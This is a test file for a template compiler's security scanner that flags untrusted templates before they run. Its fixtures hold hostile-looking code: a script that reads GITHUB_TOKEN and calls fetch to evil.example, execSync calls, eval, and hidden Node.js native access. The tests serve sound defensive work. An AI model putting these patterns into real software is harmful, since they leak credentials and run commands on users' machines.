// ###################
// Protector tests: untrusted templates never run
// ###################

import { describe, it, expect, afterEach } from "vitest";
import { rm, readFile, writeFile } from "node:fs/promises";
import { fileURLToPath } from "node:url";
import { join, resolve, dirname } from "node:path";
import ArcMoon from "../node/compiler.js";
import loadModules from "../core/modules.js";
import { analyze, check, trust, untrust, readTrust, ProtectorError } from "../node/protector.js";

const PROJECT = fileURLToPath(new URL("./fixtures/protector/project", import.meta.url));
const TRUST = join(PROJECT, "arcmoon.trust.json");

const host = {
	resolve: (p, from) => (p.startsWith(".") ? resolve(dirname(from), p) : join(PROJECT, "node_modules", p)),
	readFile: (f) => readFile(f, "utf8")
};
const graphOf = (file) => loadModules({ id: join(PROJECT, file) }, host);
const compile = (file) => new ArcMoon({ filename: file, cwd: PROJECT }).compile();

afterEach(async () => {
	await rm(TRUST, { force: true });
	delete globalThis.__arcmoonTemplateRan;
});

describe("protector: analyze", () => {
	it("treats files inside the project as your own", async () => {
		const result = await analyze(await graphOf("page.arcm"), { root: PROJECT });
		expect(result.own.files).toEqual([join(PROJECT, "page.arcm")]);
	});

	it("groups outside files into a template and reports what it does", async () => {
		const { templates } = await analyze(await graphOf("page.arcm"), { root: PROJECT });
		expect(templates).toHaveLength(1);
		const [t] = templates;
		expect(t.key).toBe("../external/blog");
		expect([...t.report.imports]).toEqual(expect.arrayContaining(["node:child_process", "node:fs (read/write)", "acorn"]));
		expect([...t.report.risky]).toEqual(expect.arrayContaining(["child_process", "fs (write)"]));
		expect([...t.report.fetch]).toEqual(["evil.example"]);
		expect([...t.report.env]).toEqual(expect.arrayContaining(["GITHUB_TOKEN", "API_KEY"]));
		expect(t.report.dynamic[0]).toMatch(/^eval\(\) at .*Post\.arcm:10:3$/);
		expect(t.report.runtimeBlocks).toBe(1);
		expect([...t.report.runtimeImports]).toEqual(["canvas-confetti"]);
		expect(t.report.exports).toEqual([{ name: "leaked", fromEnv: true }]);
		expect([...t.report.localScripts].sort()).toEqual([
			fileURLToPath(new URL("./fixtures/protector/external/blog/helper.js", import.meta.url)),
			fileURLToPath(new URL("./fixtures/protector/external/blog/rt.js", import.meta.url))
		]);
		expect(t.versions.acorn).toMatch(/^\d+\.\d+\.\d+$/);
		expect(t.hash).toMatch(/^sha256-[0-9a-f]{64}$/);
	});

	it("reports [script = src] files and hashes them", async () => {
		const g = await loadModules({ id: join(PROJECT, "page.arcm"), src: `[script = src: "../external/blog/helper.js" !]` }, host);
		const { own } = await analyze(g, { root: PROJECT });
		expect([...own.report.localScripts]).toEqual([fileURLToPath(new URL("./fixtures/protector/external/blog/helper.js", import.meta.url))]);
		expect(own.report.scriptTags).toBe(1);
	});

	it("names node_modules templates by package and reads fs as read-only", async () => {
		const { templates } = await analyze(await graphOf("uses-package.arcm"), { root: PROJECT });
		expect(templates[0].key).toBe("fancy-ui");
		expect([...templates[0].report.imports]).toEqual(["node:fs (read)"]);
		expect([...templates[0].report.risky]).toEqual([]);
	});
});

describe("protector: trust hash", () => {
	it("changes when a runtime script changes", async () => {
		const rt = fileURLToPath(new URL("./fixtures/protector/external/blog/rt.js", import.meta.url));
		const before = (await analyze(await graphOf("page.arcm"), { root: PROJECT })).templates[0].hash;
		await writeFile(rt, "export default 3;\n");
		try {
			const after = (await analyze(await graphOf("page.arcm"), { root: PROJECT })).templates[0].hash;
			expect(after).not.toBe(before);
		} finally {
			await writeFile(rt, "export default 2;\n");
		}
	});
});

describe("protector: trust check", () => {
	it("stops before running an untrusted template", async () => {
		const error = await compile("page.arcm").catch((e) => e);
		expect(error).toBeInstanceOf(ProtectorError);
		expect(error.message).toContain(`Template "../external/blog" is not trusted`);
		expect(error.message).toContain(`arcmoon trust ../external/blog`);
		expect(error.message).toContain("leaked (from process.env!)");
		expect(error.message).toContain("Nothing was run.");
		expect(globalThis.__arcmoonTemplateRan).toBeUndefined();
	});

	it("passes once trusted, and asks again when the template changes", async () => {
		const graph = await graphOf("page.arcm");
		const saved = await trust(graph, { root: PROJECT });
		expect(saved.map((t) => t.key)).toEqual(["../external/blog"]);
		await expect(check(graph, { root: PROJECT })).resolves.toBeTruthy();

		const data = await readTrust(PROJECT);
		data.templates["../external/blog"].hash = "sha256-old";
		await writeFile(TRUST, JSON.stringify(data));
		await expect(check(graph, { root: PROJECT })).rejects.toThrow(/has changed since it was trusted/);
	});

	it("compiles a trusted node_modules template", async () => {
		await expect(compile("uses-package.arcm")).rejects.toThrow(/Template "fancy-ui" is not trusted/);
		await trust(await graphOf("uses-package.arcm"), { root: PROJECT });
		expect((await compile("uses-package.arcm")).trim()).toBe("<button>ok</button>");
	});

	it("untrust removes a template", async () => {
		await trust(await graphOf("uses-package.arcm"), { root: PROJECT });
		expect(await untrust(["fancy-ui"], { root: PROJECT })).toEqual(["fancy-ui"]);
		await expect(compile("uses-package.arcm")).rejects.toThrow(ProtectorError);
	});
});

describe("protector: trust hash follows script imports", () => {
	it("changes when a file a local script imports changes, also through a folder", async () => {
		const { mkdtemp, mkdir } = await import("node:fs/promises");
		const { tmpdir } = await import("node:os");
		const dir = await mkdtemp(join(tmpdir(), "arcmoon-trust-"));
		try {
			await mkdir(join(dir, "site"));
			await mkdir(join(dir, "theme/lib"), { recursive: true });
			await writeFile(join(dir, "theme/Hero.arcm"), `\${ import h from "./helper.js"; }\$\n[section]hero[end]`);
			await writeFile(join(dir, "theme/helper.js"), `import "./deep.js";\nimport "./lib";\nexport default 1;\n`);
			await writeFile(join(dir, "theme/deep.js"), "export const x = 1;\n");
			await writeFile(join(dir, "theme/lib/index.js"), "export const y = 1;\n");
			await writeFile(join(dir, "site/page.arcm"), `[import = Hero: "../theme/Hero.arcm" !]\n[Hero!]`);

			const siteHost = { resolve: (p, from) => resolve(dirname(from), p), readFile: (f) => readFile(f, "utf8") };
			const hashOf = async () => (await analyze(await loadModules({ id: join(dir, "site/page.arcm") }, siteHost), { root: join(dir, "site") })).templates[0].hash;

			const before = await hashOf();
			await writeFile(join(dir, "theme/deep.js"), `import("node:child_process").then((c) => c.execSync("id"));\n`);
			const afterDeep = await hashOf();
			expect(afterDeep).not.toBe(before);
			await writeFile(join(dir, "theme/lib/index.js"), "export const y = 2;\n");
			expect(await hashOf()).not.toBe(afterDeep);
		} finally {
			await rm(dir, { recursive: true, force: true });
		}
	});
});

describe("protector: local scripts are scanned", () => {
	it("reports what a script and the files it imports do, at their own lines", async () => {
		const { mkdtemp, mkdir } = await import("node:fs/promises");
		const { tmpdir } = await import("node:os");
		const dir = await mkdtemp(join(tmpdir(), "arcmoon-scan-"));
		try {
			await mkdir(join(dir, "site"));
			await mkdir(join(dir, "theme"));
			await writeFile(join(dir, "theme/Hero.arcm"), `\${ import h from "./helper.js"; }\$\n[section]hero[end]`);
			await writeFile(join(dir, "theme/helper.js"), `import "./deep.js";\nexport const token = process.env.GITHUB_TOKEN;\nfetch("https://evil.example/collect");\n`);
			await writeFile(join(dir, "theme/deep.js"), `import { execSync } from "node:child_process";\nexport const run = () => execSync("id");\neval("1");\n`);
			await writeFile(join(dir, "site/page.arcm"), `[import = Hero: "../theme/Hero.arcm" !]\n[Hero!]`);

			const siteHost = { resolve: (p, from) => resolve(dirname(from), p), readFile: (f) => readFile(f, "utf8") };
			const { templates } = await analyze(await loadModules({ id: join(dir, "site/page.arcm") }, siteHost), { root: join(dir, "site") });
			const { report } = templates[0];
			expect([...report.risky]).toEqual(["child_process"]);
			expect([...report.fetch]).toEqual(["evil.example"]);
			expect([...report.env]).toEqual(["GITHUB_TOKEN"]);
			expect(report.dynamic).toEqual([`eval() at ${join(dir, "theme/deep.js")}:3:1`]);
			expect([...report.localScripts].map((f) => f.slice(dir.length + 1).replaceAll("\\", "/")).sort()).toEqual(["theme/deep.js", "theme/helper.js"]);
			expect(report.exports).toEqual([]);
		} finally {
			await rm(dir, { recursive: true, force: true });
		}
	});
});

describe("protector: hidden Node.js access", () => {
	it("reports getBuiltinModule, binding, dlopen, createRequire and require", async () => {
		const { mkdtemp, mkdir } = await import("node:fs/promises");
		const { tmpdir } = await import("node:os");
		const dir = await mkdtemp(join(tmpdir(), "arcmoon-native-"));
		try {
			await mkdir(join(dir, "site"));
			await mkdir(join(dir, "theme"));
			await writeFile(
				join(dir, "theme/Hero.arcm"),
				[
					"${",
					'  import { createRequire } from "node:module";',
					'  const cp = process.getBuiltinModule("child_process");',
					'  const fs = globalThis.process.getBuiltinModule("fs");',
					"  const any = process.getBuiltinModule(name);",
					'  process.binding("fs");',
					'  process["dlopen"](m, "x.node");',
					"  const req = createRequire(import.meta.url);",
					'  const os = require("node:os");',
					"  const other = require(pick);",
					"}$",
					"[section]hero[end]"
				].join("\n")
			);
			await writeFile(join(dir, "site/page.arcm"), `[import = Hero: "../theme/Hero.arcm" !]\n[Hero!]`);

			const siteHost = { resolve: (p, from) => resolve(dirname(from), p), readFile: (f) => readFile(f, "utf8") };
			const { report } = (await analyze(await loadModules({ id: join(dir, "site/page.arcm") }, siteHost), { root: join(dir, "site") })).templates[0];
			expect([...report.imports]).toEqual(["node:module", "node:child_process", "node:fs (read/write)", "node:os"]);
			expect([...report.risky]).toEqual(["module", "child_process", "fs (write)", "process.binding", "process.dlopen", "createRequire"]);
			expect(report.dynamic.map((d) => d.replace(/ at .*$/, ""))).toEqual(["process.getBuiltinModule() with a computed name", "require() with a computed name"]);
		} finally {
			await rm(dir, { recursive: true, force: true });
		}
	});
});

describe("protector: indirect process.env and fetch", () => {
	it("reports every use that isn't a plain form, and not the template's own names", async () => {
		const { mkdtemp, mkdir } = await import("node:fs/promises");
		const { tmpdir } = await import("node:os");
		const dir = await mkdtemp(join(tmpdir(), "arcmoon-indirect-"));
		try {
			await mkdir(join(dir, "site"));
			await mkdir(join(dir, "theme"));
			await writeFile(
				join(dir, "theme/Hero.arcm"),
				[
					"${",
					'  import { env as e } from "node:process";',
					"  const a = globalThis.process[\"env\"].GITHUB_TOKEN;",
					"  const b = process.env.API_KEY;",
					"  const p = process;",
					"  const k = process[key];",
					"  const f = globalThis.fetch;",
					'  globalThis.fetch("https://a.example/x");',
					"  const g = fetch;",
					'  fetch("https://b.example/y");',
					"  const d = e.DB_URL;",
					"  const cwd = process.cwd();",
					"  const obj = { process: 1, fetch: 2 };",
					"  function own(process, fetch) { return [process, fetch]; }",
					"}$",
					"[section]hero[end]"
				].join("\n")
			);
			await writeFile(join(dir, "site/page.arcm"), `[import = Hero: "../theme/Hero.arcm" !]\n[Hero!]`);

			const siteHost = { resolve: (p, from) => resolve(dirname(from), p), readFile: (f) => readFile(f, "utf8") };
			const { report } = (await analyze(await loadModules({ id: join(dir, "site/page.arcm") }, siteHost), { root: join(dir, "site") })).templates[0];
			const short = (list) => [...list].map((x) => x.replace(/ at .*Hero\.arcm:/, " at "));
			expect([...report.env]).toEqual(["GITHUB_TOKEN", "API_KEY", "(all)", "DB_URL"]);
			expect(short(report.fetch)).toEqual(["any host (fetch used indirectly at 7:13)", "a.example", "any host (fetch used indirectly at 9:13)", "b.example"]);
			expect(short(report.dynamic)).toEqual(["process used indirectly at 5:13", "process[…] with a computed name at 6:13"]);
		} finally {
			await rm(dir, { recursive: true, force: true });
		}
	});
});
